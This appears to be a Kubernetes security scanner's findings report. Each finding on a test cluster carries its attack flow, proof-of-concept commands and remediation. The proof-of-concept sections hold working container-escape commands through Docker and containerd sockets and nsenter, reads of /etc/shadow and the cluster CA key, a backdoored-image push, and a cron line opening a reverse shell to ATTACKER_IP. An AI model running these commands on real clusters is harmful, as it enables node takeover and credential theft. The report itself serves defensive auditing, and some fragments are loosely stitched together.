findings.title: API Server Anonymous Access Enabled
findings.description: API server --anonymous-auth is not explicitly set to false. Unauthenticated requests can enumerate cluster resources.
findings.remediation: Set --anonymous-auth=false on the kube-apiserver.
exploitation: Kubernetes API server accessible without any authentication token or certificate
Anonymous callers are assigned system:anonymous user and system:unauthenticated group
Any RBAC ClusterRoleBinding to system:anonymous or system:unauthenticated = unauthenticated API access
Anonymous enumeration reveals cluster topology, workloads, and RBAC configuration
attack_flow: [CHAIN: Anonymous API Access → Resource Enumeration → RBAC Misconfiguration → Cluster Takeover]
Step 1 — Discover API server URL from kubeconfig or cluster DNS
Step 2 — Query API without credentials: curl -sk https://$API_SERVER/api/v1/namespaces
Step 3 — Enumerate resources: pods, secrets, configmaps, clusterroles, bindings
Step 4 — Check if system:anonymous has dangerous RBAC grants: kubectl auth can-i --list --as=system:anonymous
Step 5 — If any write permission exists: create backdoor ClusterRoleBinding or deploy malicious pod
Result: Anonymous access + any RBAC misconfiguration = full cluster compromise without credentials
findings.impact: CRITICAL - API server accepts unauthenticated requests; anonymous callers can enumerate cluster resources, and any RBAC binding to system:anonymous escalates to full API access
findings.proof_of_concept:
# CRITICAL: API Server Anonymous Access Enabled
# --anonymous-auth=true means unauthenticated requests are accepted as system:anonymous.
# Risk: any RBAC binding to system:anonymous or system:unauthenticated = no-credential API access.

API_SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

# Step 1: Confirm anonymous requests reach the API server (403 = accepted but denied, 401 = rejected)
curl -sk $API_SERVER/api/v1/namespaces | python3 -c "import sys,json; d=json.load(sys.stdin); print('HTTP status:', d.get('code'), '— user:', d.get('details',{}).get('name','system:anonymous'))"
# 403 Forbidden = server accepted the anonymous request (anonymous-auth is ON)

# Step 2: Check what system:anonymous can actually do (look for non-empty allowed list)
kubectl auth can-i --list --as=system:anonymous 2>/dev/null
kubectl auth can-i list secrets --as=system:anonymous
kubectl auth can-i create pods --as=system:anonymous

# Step 3: Attempt resource enumeration as anonymous
curl -sk $API_SERVER/api/v1/pods | python3 -c "import sys,json; d=json.load(sys.stdin); print('Pods visible (403=blocked, 200=CRITICAL):', d.get('code',200))"

# REMEDIATION: Set --anonymous-auth=false on kube-apiserver:
# /etc/kubernetes/manifests/kube-apiserver.yaml: add --anonymous-auth=false
findings.cis_title: Ensure that the --anonymous-auth argument is set to false

findings.title: Containerd Socket Mount Detected
findings.description: DaemonSet 'docker-bench-security' mounts sensitive host path /run/containerd/containerd.sock
findings.remediation: Remove hostPath mount. Use Kubernetes Secrets/ConfigMaps/PersistentVolumes.
exploitation: Direct access to containerd runtime bypasses all Kubernetes admission controls
Spawn privileged containers with host filesystem mounts via ctr or raw gRPC
Full host filesystem access through new container — equivalent to host root
attack_flow: Get shell in pod with containerd socket mounted
Verify socket path (commonly /run/containerd/containerd.sock)
List running containers via ctr to identify target images already pulled
Create new privileged container with host root bind-mounted
Chroot into /host — full root shell on node OS
Result: Complete node takeover, access to all container secrets and kubeconfig
findings.impact: CRITICAL - containerd socket access is equivalent to node root. Spawning containers via containerd bypasses kube-apiserver, RBAC, and admission webhooks entirely.
findings.proof_of_concept:
# CRITICAL: Containerd Socket Mount - Container Runtime Escape

# Step 1: Enter the pod
kubectl exec -it ds/docker-bench-security -n default -- /bin/sh

# Step 2: Verify socket and list running containers
ls -la /run/containerd/containerd.sock
ctr --address /run/containerd/containerd.sock -n k8s.io containers ls 2>/dev/null

# Step 3: Spawn privileged container with host root (using ctr)
ctr --address /run/containerd/containerd.sock -n k8s.io \
  run --rm -t --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest rootsh /bin/sh -c "chroot /host sh"

# Step 4: If ctr not in PATH — use the socket directly via crictl
crictl --runtime-endpoint unix:///run/containerd/containerd.sock pods 2>/dev/null

# Step 5: From host shell — steal credentials
cat /host/etc/shadow
cat /host/root/.kube/config 2>/dev/null
find /host/var/lib/kubelet -name "*.kubeconfig" 2>/dev/null | xargs cat

# REMEDIATION: Never mount containerd.sock into pods.
# If runtime introspection is needed, use the CRI API via a dedicated sidecar with
# minimal read-only permissions — never the raw socket.

findings.title: Docker Socket Mount Detected
findings.description: DaemonSet 'docker-bench-security' mounts sensitive host path /var/run/docker.sock
findings.remediation: Remove hostPath mount. Use Kubernetes Secrets/ConfigMaps/PersistentVolumes.
exploitation: Full Docker daemon access via mounted socket
Create privileged containers bypassing all security controls
Access all container filesystems, secrets, and images on the node
attack_flow: Get shell in pod with docker.sock mounted
Verify socket is accessible (ls -la /var/run/docker.sock)
Use docker CLI or raw API to spawn a new privileged container
Mount host root filesystem into new container
Chroot into host for full node compromise
Result: Complete node takeover — root shell on host OS
findings.impact: CRITICAL - Docker socket grants equivalent root access on the host node. Any process that can write to docker.sock owns the node.
findings.proof_of_concept:
# CRITICAL: Docker Socket Mount - Node Takeover

# Step 1: Enter the pod and verify socket
kubectl exec -it ds/docker-bench-security -n default -- /bin/sh
ls -la /var/run/docker.sock

# Step 2a: If docker binary available — direct escape
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \
  -v /:/host alpine chroot /host /bin/sh

# Step 2b: If docker not available — raw API via curl
curl -s --unix-socket /var/run/docker.sock \
  "http://localhost/containers/json" | head -c 500

# Step 2c: If containerd is available instead of docker
ctr --address /run/containerd/containerd.sock \
  run --rm -t --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest rootsh /bin/sh

# Step 3: Once on host — read sensitive node files
cat /host/etc/shadow
cat /host/root/.kube/config 2>/dev/null
cat /host/var/lib/kubelet/config.yaml 2>/dev/null

# REMEDIATION: Never mount docker.sock or containerd.sock into pods.
# Use the Kubernetes API instead of runtime sockets.

findings.title: Overly Permissive Role Binding
findings.description: ClusterRoleBinding 'superadmin' grants cluster-admin to 'superadmin' — full cluster control.
findings.remediation: Remove cluster-admin ClusterRoleBinding. Create a minimal ClusterRole with only the required permissions.
exploitation: Overly broad permissions granted to subject
Access to multiple resource types and verbs
Privilege escalation vectors via pod creation or secret access
Lateral movement enabled across namespace
attack_flow: Identify the bound role and its subjects
Obtain token for the bound ServiceAccount or user
Enumerate all granted permissions via auth can-i --list
Chain permissions: read secrets → get credentials → create pods
Result: Privilege escalation via overly permissive binding
findings.impact: {severity} - Overly permissive role binding grants a subject broad read/write/exec access; chaining read-secrets + create-pods or exec leads to credential theft and node-level privilege escalation
findings.proof_of_concept:
# CRITICAL: Overly Permissive Role Binding

# Inspect the binding and its role
kubectl get clusterrolebinding superadmin  -o yaml
kubectl auth can-i --list 

# Extract SA token and enumerate actual permissions
TARGET_POD=$(kubectl get pods  --no-headers -o custom-columns=":metadata.name" | head -1)
kubectl exec -it $TARGET_POD  -- sh -c \
  'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
   curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces'

# REMEDIATION: Replace with a minimal Role granting only required permissions
findings.cis_title: Ensure that the cluster-admin role is only used where required

findings.title: Privileged Container Detected
findings.description: Container 'docker-bench' in DaemonSet 'docker-bench-security' runs in privileged mode — full host kernel access.
findings.remediation: Set privileged: false. Use specific capabilities instead.
exploitation: Container breakout to host system via privileged mode
Direct root shell on host via nsenter to PID 1
Mount host filesystem and access sensitive data
Execute commands as root on the host node
Read SSH keys, secrets, and credentials from host
attack_flow: [CHAIN: Privileged Container → Host Root → CA Key Theft → Cluster Takeover]
Step 1 — Exec into the privileged container (pod exec, RCE in app, or leaked credentials)
Step 2 — nsenter -t 1 -m -u -n -i sh → IMMEDIATE root shell on host node (1 command)
Step 3 — Read /etc/kubernetes/pki/ca.key — cluster Certificate Authority private key
Step 4 — Forge cluster-admin client certificate signed by stolen CA — RBAC completely irrelevant
Step 5 — kubectl get secrets -A with forged cert → all secrets in all namespaces
Step 6 — Access cloud metadata: curl 169.254.169.254 → IAM credentials → cloud account takeover
Step 7 — SSH into other cluster nodes via host network — all nodes compromised
Result: One privileged container = complete cluster + cloud account compromise; namespace isolation provides ZERO protection
findings.impact: CRITICAL - Complete node compromise leading to cluster-wide access. Single nsenter command gives host root shell. CA key theft allows forging cluster-admin certificates, bypassing all RBAC.
findings.proof_of_concept:
# CRITICAL: Privileged Container - Host Escape

# Step 1: If hostPID:true is also set → immediate host root shell via nsenter
kubectl exec -it ds/docker-bench-security -n default -c docker-bench -- nsenter -t 1 -m -u -n -i sh
# Verify escape: hostname must return node name (not pod name), id = uid=0(root)

# Step 2: If no hostPID → escalate via host block device access (privileged alone)
kubectl exec -it ds/docker-bench-security -n default -c docker-bench -- sh
# Find and mount host disk:
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /tmp/host && mount /dev/sda1 /tmp/host 2>/dev/null
cat /tmp/host/etc/shadow
cat /tmp/host/etc/kubernetes/pki/ca.key

# Step 3: Read host secrets via mounted hostPath (if any /host-* path is present)
kubectl exec -it ds/docker-bench-security -n default -- sh -c "find / -name 'ca.key' -o -name 'kubeconfig' 2>/dev/null | grep -v proc"

# REMEDIATION: Set privileged: false; use specific capabilities instead of full root
findings.cis_title: Ensure that admission controller does not admit privileged containers

findings.title: Root Directory Mount
findings.description: DaemonSet 'docker-bench-security' mounts sensitive host path /
findings.remediation: Remove hostPath mount. Use Kubernetes Secrets/ConfigMaps/PersistentVolumes.
exploitation: Host root (/) mount exposes entire node filesystem read-write from inside the container
Read /etc/shadow, /root/.ssh/authorized_keys, kubeconfig, kubelet credentials
Write persistence: /etc/cron.d, /etc/sudoers, SSH authorized_keys
Forge cluster-admin certificates by reading /etc/kubernetes/pki/ca.key
attack_flow: Get shell in pod with hostPath '/' mount
Identify the mount point inside the container (commonly /host, /host-system, /mnt)
Read /host/etc/shadow — extract node password hashes
Read /host/root/.kube/config or /host/var/lib/kubelet/*.kubeconfig
Read /host/etc/kubernetes/pki/ca.key — forge cluster-admin certificates
Write /host/etc/cron.d/backdoor — persistent root-level execution on node
Result: Full node takeover and cluster-admin credential theft
findings.impact: CRITICAL - Host root mount is equivalent to physical root access on the node. Every file on the host is readable and writable from inside the container.
findings.proof_of_concept:
# CRITICAL: Host Root Mount - Full Node Filesystem Access

# Step 1: Find the host root mount point inside the container
kubectl exec -it ds/docker-bench-security -n default -- sh -c "mount | grep -v 'tmpfs\|proc\|sys\|cgroup\|overlay'"
# Common paths: /host, /host-system, /host-root, /mnt

# Step 2: Read sensitive host files
kubectl exec -it ds/docker-bench-security -n default -- cat /host-system/etc/shadow
kubectl exec -it ds/docker-bench-security -n default -- cat /host-system/root/.kube/config 2>/dev/null
kubectl exec -it ds/docker-bench-security -n default -- cat /host-system/etc/kubernetes/pki/ca.key 2>/dev/null

# Step 3: If hostPID is also true — use nsenter for a clean host shell
kubectl exec -it ds/docker-bench-security -n default -- nsenter --mount=/proc/1/ns/mnt -- /bin/bash
# Verify: id → uid=0(root), hostname → node name

# Step 4: From host mount — write persistence
kubectl exec -it ds/docker-bench-security -n default -- sh -c \
  'echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /host-system/etc/cron.d/k8s-backdoor'

# REMEDIATION: Never mount '/', '/etc', '/proc', '/sys', '/var/lib/kubelet', or '/etc/kubernetes'
# as hostPath volumes. Use PersistentVolumeClaims for storage needs.

findings.title: Missing Network Policy
findings.description: Namespace 'local-path-storage' has no NetworkPolicy. All pods can communicate freely — no micro-segmentation.
findings.remediation: Apply a default-deny-all NetworkPolicy and allow only required traffic explicitly.
exploitation: No network segmentation — all pods can talk to all pods
Lateral movement from any compromised pod to databases/APIs
Internal service discovery and port scanning
Direct access to sensitive backend services bypassing ingress
attack_flow: Compromise any pod in namespace
Deploy netshoot pod for full network toolkit
Scan internal network for services (nmap, curl, dig)
Access databases, caches, and internal APIs directly
Result: Full lateral movement within cluster
findings.impact: HIGH - No network isolation enables lateral movement, direct database access, and data exfiltration from any compromised pod in the namespace
findings.proof_of_concept:
# HIGH: Missing Network Policy - Lateral Movement

kubectl get networkpolicies -n local-path-storage
# "No resources found" = VULNERABLE

# Scan cluster-internal services from any pod in namespace
kubectl run lateral-test --rm -it --image=nicolaka/netshoot --image-pull-policy=IfNotPresent -n local-path-storage -- /bin/bash
nmap -sT -p 80,443,3306,5432,6379,27017,9200 10.96.0.0/12 --open -T4
redis-cli -h <REDIS_SVC>.local-path-storage.svc.cluster.local

# REMEDIATION: Apply default-deny NetworkPolicy then explicitly allow required traffic
findings.cis_title: Ensure that all Namespaces have Network Policies defined

findings.title: No Admission Policy Engine Detected
findings.description: No policy admission engine (Gatekeeper, Kyverno, OPA) was found. Without a policy engine, security policies cannot be enforced at admission time — misconfigured resources can be created.
findings.remediation: Deploy Kyverno (https://kyverno.io) or OPA Gatekeeper (https://open-policy-agent.github.io/gatekeeper) to enforce policies.
exploitation: No policy engine (OPA/Gatekeeper, Kyverno, or Pod Security Admission) detected
Any user with pod create permission can deploy privileged, host-mounted workloads
No image allowlist enforcement — malicious images deployable from any registry
No runtime security constraints enforced at deployment time
attack_flow: [CHAIN: No Admission Engine → Unrestricted Pod Creation → Instant Cluster Takeover]
Step 1 — Any user or SA with pods/create can deploy any pod spec with no restriction
Step 2 — Deploy privileged pod: hostPID:true + hostNetwork:true + hostPath:/ + privileged:true
Step 3 — Zero friction — no OPA/Gatekeeper/Kyverno/PSA exists to deny the request
Step 4 — kubectl exec into pod: nsenter -t 1 -m -u -n -i sh → host root immediately
Step 5 — From host: steal CA key, forge cluster-admin cert, read cloud metadata IAM credentials
CRITICAL FINDING: pods/create permission WITHOUT admission engine = cluster-admin equivalent
Result: Without admission control, the entire Kubernetes RBAC model is undermined by privileged pod deployment

findings.title: Potentially Unauthenticated Container Registry Exposed
findings.description: Service 'poor-registry-service' (namespace: default) appears to be a Docker registry (port 5000, name contains 'registry'). If it is unauthenticated, any pod that can reach it may pull images and enumerate repository contents, exposing secrets baked into image layers or enabling image substitution. k8scan does not verify the registry's auth configuration — treat this as a lead to investigate. No ingress NetworkPolicy is active in this namespace, so any pod in the cluster can reach it.
findings.remediation: Enable registry authentication (htpasswd or token-based). Add a NetworkPolicy restricting port 5000 to authorized workloads only.
exploitation: Container registry is accessible without authentication
Any client can list all repositories and pull any image
Images may contain hardcoded secrets, credentials, or proprietary source code
Attacker can push malicious backdoored images (supply chain attack)
attack_flow: Discover registry service on port 5000
Access /v2/_catalog to enumerate all repositories
Pull images and inspect layers for secrets (env vars, config files, keys)
Optionally push a trojaned image with the same tag
Wait for Kubernetes to pull and run the backdoored image
Result: RCE in cluster, secret theft, supply chain compromise
findings.impact: MEDIUM - A container registry reachable without authentication allows image enumeration, secret extraction from layers, and supply chain poisoning via image push
findings.proof_of_concept:
# Validation: Potentially Unauthenticated Container Registry Exposed

# Step 1: List all repositories in the registry
REGISTRY_IP=$(kubectl get svc poor-registry-service -n default -o jsonpath='{.spec.clusterIP}')
kubectl run -it --rm tmp-poc --image=alpine --restart=Never -- \
  wget -qO- http://$REGISTRY_IP:5000/v2/_catalog

# Step 2: List tags for a specific repo
kubectl run -it --rm tmp-poc --image=alpine --restart=Never -- \
  wget -qO- http://$REGISTRY_IP:5000/v2/<IMAGE_NAME>/tags/list

# Step 3: Extract secrets from image history
docker pull $REGISTRY_IP:5000/<IMAGE_NAME>:<TAG>
docker history --no-trunc $REGISTRY_IP:5000/<IMAGE_NAME>:<TAG> | grep -i "env\|secret\|key\|pass\|token"

# Step 4: Supply chain attack — push backdoored image
docker tag malicious:latest $REGISTRY_IP:5000/<IMAGE_NAME>:<TAG>
docker push $REGISTRY_IP:5000/<IMAGE_NAME>:<TAG>

# REMEDIATION: Enable registry authentication and network policies to restrict access

Result: data theft, session hijacking, or lateral movement

findings.title: Privilege Escalation Allowed
findings.description: Container 'system-monitor' in Deployment 'system-monitor-deployment': allowPrivilegeEscalation is not set to false.
findings.remediation: Set securityContext.allowPrivilegeEscalation: false
exploitation: allowPrivilegeEscalation: true (default) permits setuid/setgid binaries to elevate privileges
If any process in the container exploits a SUID binary it can gain root even if container started as non-root
Combined with a container breakout: elevated privileges ease host escape
attack_flow: Exec into container and enumerate SUID binaries
Identify exploitable SUID binary (su, mount, pkexec, sudo)
Exploit SUID binary to gain root within container
Use root + other misconfigs (hostPath, capabilities) to escape to host
Result: Non-root container becomes root, then chain to node compromise
findings.impact: MEDIUM - allowPrivilegeEscalation not disabled; SUID binaries inside the container may be exploited to gain root if the process starts as non-root
findings.proof_of_concept:

# Step 1: Enumerate SUID binaries in the container
kubectl exec -it deploy/system-monitor-deployment -n default -c system-monitor -- \
  find /usr/bin /bin /usr/local/bin /sbin -perm -4000 -type f 2>/dev/null
# Common: su, mount, passwd, pkexec, sudo

# Step 2: Verify current privilege level
kubectl exec -it deploy/system-monitor-deployment -n default -- id
# If uid != 0 but SUID binary exists → privilege escalation possible

# Step 3: Check kernel version for known privilege escalation CVEs
kubectl exec -it deploy/system-monitor-deployment -n default -- uname -r
# Compare against: CVE-2021-4034 (pkexec), CVE-2022-0847 (Dirty Pipe), CVE-2021-22555

# REMEDIATION: Set allowPrivilegeEscalation: false in securityContext
# This prevents setuid binaries from gaining additional privileges

findings.title: Image Not Pinned to Digest
findings.description: Container 'local-path-provisioner' in Deployment 'local-path-provisioner' uses image 'docker.io/kindest/local-path-provisioner:v20251212-v0.29.0-alpha-105-g20ccfc88' with a tag (not a digest). Tags are mutable — a registry push can silently change what image is pulled, enabling supply-chain attacks.
findings.remediation: Pin images to their SHA256 digest (e.g. nginx@sha256:abc123...). Use tools like Cosign or docker inspect to get the digest.
exploitation: Image tagged by name (not digest) means pulling the same tag may return different images
Registry tag can be overwritten by attacker or compromised CI/CD pipeline
Supply chain attack: push malicious image with same tag — next pod restart executes it
No cryptographic guarantee that the running image is the intended one
attack_flow: Attacker gains write access to the container registry (stolen credentials, misconfigured registry)
Overwrite the image tag with a backdoored image
On next pod restart or scale-up, the malicious image is pulled and executed
Malicious image phones home, exfiltrates data, or provides reverse shell
Result: Supply chain compromise via tag mutation — indistinguishable from legitimate image
findings.impact: LOW - Image pinned by tag only; a mutable tag can be silently replaced with a malicious image and pulled on the next pod restart without any alert
findings.proof_of_concept:
# MEDIUM: Image Not Pinned to Digest - Supply Chain Risk

# Check current image reference (tag-based, not digest)
kubectl get Deployment local-path-provisioner -n local-path-storage \
  -o jsonpath='{.spec.template.spec.containers[*].image}'
# Format: registry/image:tag (no @sha256: = VULNERABLE)

# Get the current image digest (what is ACTUALLY running)
kubectl get pod -n local-path-storage -l app=local-path-provisioner \
  -o jsonpath='{.items[0].status.containerStatuses[*].imageID}'
# Shows the actual sha256 digest being used

# Verify the tag can be overwritten (registry allows push without immutable tags)
docker pull <REGISTRY>/<IMAGE>:<TAG>
docker tag malicious-image:latest <REGISTRY>/<IMAGE>:<TAG>
docker push <REGISTRY>/<IMAGE>:<TAG>  # Overwrites the tag!

# REMEDIATION: Pin to digest instead of tag:
# image: nginx@sha256:abc123...  (get digest: docker inspect --format='{{index .RepoDigests 0}}' nginx:1.25)

findings.title: Missing ResourceQuota on Namespace
findings.description: Namespace 'local-path-storage' has no ResourceQuota. A single misbehaving workload can exhaust CPU/memory for the entire namespace or cluster.
findings.remediation: Define a ResourceQuota with CPU, memory, and pod count limits for every namespace.
exploitation: No ResourceQuota allows unlimited resource consumption in the namespace
A single runaway workload can exhaust all cluster CPU/memory
Malicious workload can consume all node resources causing eviction of other pods
No guardrail against crypto miners, fork bombs, or accidental resource leaks
attack_flow: Deploy a resource-hungry workload in the unquota'd namespace
Workload consumes all available node CPU/memory
Other namespaces' pods evicted due to resource pressure
OOMKiller terminates co-located pods across the cluster
Result: Tenant-isolation breach — one namespace starves all others
findings.impact: LOW - No ResourceQuota allows one namespace to exhaust cluster resources, starving all other workloads (requires workload create permission)
findings.proof_of_concept:
# LOW: Missing ResourceQuota on Namespace - Resource Exhaustion

kubectl get resourcequota -n local-path-storage
# No resources found = VULNERABLE

# Deploy resource-intensive workload to demonstrate unbounded consumption
kubectl run resource-hog --image=alpine -n local-path-storage --restart=Never -- \
  sh -c "while true; do :; done"  # 100% CPU spin — no limit!

kubectl top pods -n local-path-storage  # CPU spikes with no cap
kubectl top nodes       # Node CPU impacted

# REMEDIATION: Create ResourceQuota:
kubectl create quota ns-quota -n local-path-storage \
  --hard=cpu=4,memory=8Gi,pods=20,persistentvolumeclaims=5

findings.title: Workload Running in Default Namespace
findings.description: Deployment 'health-check-deployment' runs in the 'default' namespace. Production workloads should use dedicated namespaces for isolation and network policy enforcement.
findings.remediation: Move workloads to a dedicated namespace with appropriate RBAC and NetworkPolicies. Avoid deploying applications to 'default'.
exploitation: Default namespace has no network isolation — all pods can communicate without NetworkPolicy
Default namespace RBAC is often overly permissive (default SA may have broad access)
No namespace-scoped ResourceQuota or LimitRange typically enforced in default
Incident response harder — default mixes app and system context
attack_flow: Compromised pod in default namespace can reach all other pods in default namespace
Default service account in default namespace may have unexpected RBAC permissions
No NetworkPolicy in default namespace = unrestricted lateral movement to any pod
Result: blast radius of any compromise extends to all workloads in default namespace
findings.impact: LOW - Workload in default namespace bypasses namespace-level isolation; NetworkPolicies and RBAC are harder to scope; increases blast radius of any pod compromise
findings.proof_of_concept:
# LOW: Workload in Default Namespace - No Namespace Isolation

# Verify the workload is in default namespace
kubectl get all -n default

# Check if NetworkPolicy exists in default namespace (usually none)
kubectl get networkpolicy -n default
# No resources = all pods in default can talk to each other

# Check default SA permissions in default namespace
kubectl auth can-i --list --as=system:serviceaccount:default:default -n default

# REMEDIATION: Move workload to a dedicated namespace with:
# 1. NetworkPolicy (default-deny-all ingress + egress)
# 2. ResourceQuota
# 3. Dedicated service account (automountServiceAccountToken: false)
findings.cis_title: The default namespace should not be used

findings.title: externalTrafficPolicy: Cluster Loses Source IP
findings.description: Service 'internal-proxy-info-app-service' uses externalTrafficPolicy: Cluster (default) — the original client IP is SNAT'd to a node IP. Access logs, IP-based rate limiting, and geo-blocking cannot see the real client.
findings.remediation: Set externalTrafficPolicy: Local to preserve the source IP. Note: this may cause uneven load distribution — ensure readinessProbes are configured.
exploitation: externalTrafficPolicy: Cluster causes SNAT — real client IP is hidden from pods
Application cannot perform IP-based rate limiting or geo-blocking
Firewall rules based on client IP are ineffective
Security audit logs show cluster-internal IP instead of attacker's real IP
attack_flow: Attacker makes requests to LoadBalancer service
Source IP is replaced with node IP due to SNAT in Cluster mode
Application's IP-based blocklist never blocks attacker's real IP
Rate limits apply to node IPs — all traffic from a node is rate-limited together
Result: IP-based security controls are bypassed; attacker anonymized behind node IPs
findings.impact: LOW - externalTrafficPolicy: Cluster masks the real client IP via SNAT; IP-based security controls, rate limiting, and audit logs are ineffective
findings.proof_of_concept:
# LOW: externalTrafficPolicy: Cluster - Source IP Masking

# Verify the policy
kubectl get svc internal-proxy-info-app-service -n default \
  -o jsonpath='{.spec.externalTrafficPolicy}'
# Cluster = VULNERABLE (source IP lost via SNAT)

# Confirm source IP masking — check application logs when accessing externally
EXTERNAL_IP=$(kubectl get svc internal-proxy-info-app-service -n default \
  -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
curl http://$EXTERNAL_IP/
kubectl logs -n default -l app=internal-proxy-info-app-service --tail=5 | grep -i "ip\|remote\|client"
# Log shows internal node IP, not your actual IP

# REMEDIATION:
kubectl patch svc internal-proxy-info-app-service -n default \
  -p '{"spec":{"externalTrafficPolicy":"Local"}}'

findings.title: Missing HorizontalPodAutoscaler
findings.description: Deployment 'system-monitor-deployment' has no HPA — the workload cannot automatically scale under load, risking resource exhaustion or over-provisioning.
findings.remediation: Add a HorizontalPodAutoscaler targeting this deployment with CPU or memory metrics to enable autoscaling.
exploitation: No HorizontalPodAutoscaler — workload cannot scale under load
Single-replica deployments become unavailable under traffic spikes
CPU/memory exhaustion causes OOMKill or CrashLoopBackOff
An attacker can intentionally cause resource exhaustion (DoS via traffic)
attack_flow: Send sustained traffic exceeding current replica capacity
Without HPA, no additional replicas are created
CPU throttling or OOM causes degraded response times or crashes
Result: Service degradation from load spikes or intentional DoS
findings.impact: INFO - Without HPA, the workload cannot autoscale; sustained traffic spikes cause performance degradation or service outage
findings.proof_of_concept:
# INFO: Missing HorizontalPodAutoscaler - No Auto-Scaling

# Verify no HPA exists
kubectl get hpa -n default

# Check current resource usage that would trigger scaling
kubectl top pods -n default

# Simulate load to demonstrate lack of scaling
kubectl run load-test --rm -it --image=busybox --restart=Never -- \
  sh -c "while true; do wget -q -O- http://system-monitor-deployment.default.svc.cluster.local/; done"

# Watch pod count — it will NOT increase without HPA
kubectl get pods -n default -w

# REMEDIATION: Create HPA targeting CPU utilization:
kubectl autoscale deployment system-monitor-deployment \
  --cpu-percent=70 --min=2 --max=10 -n default

findings.title: Missing LimitRange on Namespace
findings.description: Namespace 'secure-middleware' has no LimitRange. Containers without explicit limits inherit no defaults and can consume unbounded resources.
findings.remediation: Add a LimitRange to set default CPU/memory requests and limits for all containers in the namespace.

findings.title: Missing PriorityClass
findings.description: Deployment 'hunger-check-deployment' has no priorityClassName — under resource pressure, pods will be evicted with default (lowest) priority and may not be rescheduled promptly.
findings.remediation: Assign a priorityClassName appropriate to the workload's criticality (e.g. system-cluster-critical for infrastructure, or a custom PriorityClass).
exploitation: Without PriorityClass, workloads have default priority (0)
Under resource pressure, scheduler evicts lowest-priority pods first
Critical business workloads evicted before low-priority batch jobs
No SLO-based resource guarantee during cluster resource contention
attack_flow: Deploy a high-priority workload or trigger resource contention
Kubernetes scheduler evicts low-priority (no priorityClass) pods first
Business-critical service evicted while batch jobs remain running
Result: Inverted priority — important services evicted before trivial ones
findings.impact: INFO - Missing PriorityClass means the workload competes at equal priority with all other pods; resource contention may evict critical services before low-priority batch workloads
findings.proof_of_concept:
# INFO: Missing PriorityClass - Unpredictable Eviction Order

# Verify no priority class configured
kubectl get Deployment hunger-check-deployment -n big-monolith \
  -o jsonpath='{.spec.template.spec.priorityClassName}'
# Empty = no priorityClass (defaults to 0)

# List available priority classes
kubectl get priorityclasses

# Check current pod priority
kubectl get pods -n big-monolith -l app=hunger-check-deployment \
  -o jsonpath='{.items[0].spec.priority}'
# 0 = lowest priority

# REMEDIATION: Create and assign a priority class:
kubectl create priorityclass high-priority --value=1000000 --global-default=false
# Then set in pod spec: priorityClassName: high-priority

# CB-005 — Admission Control Failure
# Vulnerability Validation — Confirm policy engine cannot block privileged pods
# Purpose: Verify policy gap exists. Dry-run only — no actual deployment.

# Check 1: List active admission webhooks
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations
# VULNERABLE if no Kyverno/OPA/Gatekeeper webhook is listed

# Check 2: Check PodSecurity admission on namespace
kubectl get namespace cluster-wide -o json | \
  jq '.metadata.labels | with_entries(select(.key | startswith("pod-security")))'
# VULNERABLE if no pod-security labels are set (empty result)

# Check 3: Dry-run a privileged pod manifest — does policy block it?
kubectl apply --dry-run=server -n cluster-wide -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: validation-check-dryrun
spec:
  containers:
  - name: check
    image: alpine
    securityContext:
      privileged: true
EOF
# BOUNDARY BROKEN if dry-run succeeds (no admission webhook rejects it)

# Check 4: Verify if any PSA enforcing mode is active cluster-wide
kubectl get namespaces -o json | \
  jq '[.items[] | {name:.metadata.name, psa:.metadata.labels} |
      select(.psa | keys[] | startswith("pod-security")) ] | length'
# VULNERABLE if count is 0 (no namespaces have PSA enforcement)

    - cluster-wide/cluster
    - local-path-storage/local-path-storage

signals.title: Wildcard Resource Access Granted
signals.significance: Wildcard resource/verb expands permissions to all current and future resource types

validation_proof.combined: ClusterRoleBinding(s) or wildcard RBAC permissions allow cross-namespace resource access. The namespace boundary provides no security guarantee in this cluster — it is an organizational label, not a security boundary.

breaks.remediation: Replace ClusterRoleBindings with namespace-scoped RoleBindings where possible. Eliminate wildcard verbs/resources. Audit impersonation permissions.

# Vulnerability Validation — Confirm namespace boundary provides no security
# Purpose: Verify cross-namespace RBAC access. Does NOT modify resources.

# Check 1: List cluster-wide bindings for this service account
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]? | .name == "secret-reader") | .metadata.name'

# Check 2: Verify permission to read secrets in other namespaces
kubectl auth can-i get secrets --namespace kube-system \
  --as=system:serviceaccount:big-monolith:secret-reader
# BOUNDARY BROKEN if output = "yes"

# Check 3: Cross-namespace pod list capability
kubectl auth can-i list pods --all-namespaces \
  --as=system:serviceaccount:big-monolith:secret-reader
# BOUNDARY BROKEN if output = "yes"

# Check 4: Full RBAC permission dump for this identity
kubectl auth can-i --list --as=system:serviceaccount:big-monolith:secret-reader | head -20

  Affected namespaces: big-monolith
    - big-monolith/secret-reader

# CONFIRMED if: any cross-namespace "can-i" check returns "yes"
# IMPACT: Namespace provides organizational grouping only — not a security boundary

# Vulnerability Validation — Confirm secrets are reachable via RBAC or exec
# Purpose: Verify access path exists. Lists secret names only — no value disclosure.

  --as=system:serviceaccount:big-monolith:secret-reader

kubectl auth can-i get secrets -n big-monolith \
  --as=system:serviceaccount:big-monolith:secret-reader

# Check 2: Count accessible secrets (names only, no values)
kubectl get secrets -n big-monolith \
  --as=system:serviceaccount:big-monolith:secret-reader \
  -o name 2>/dev/null | wc -l
# VULNERABLE if count > 0

# Check 3: Check for credential material in environment variables (read-only)
kubectl exec secret-reader -n big-monolith -- env | grep -ciE 'password|secret|token|key|api|db|cred'
# VULNERABLE if count > 0

# Check 4: Check for mounted secret volumes
kubectl exec secret-reader -n big-monolith -- find /var/run/secrets /etc/secrets -maxdepth 2 -type f 2>/dev/null | head -10

  Affected namespaces: big-monolith
    - big-monolith/secret-reader

breaks.name: Container Escape to Cluster Admin
path: Container escape via privileged context / hostPID
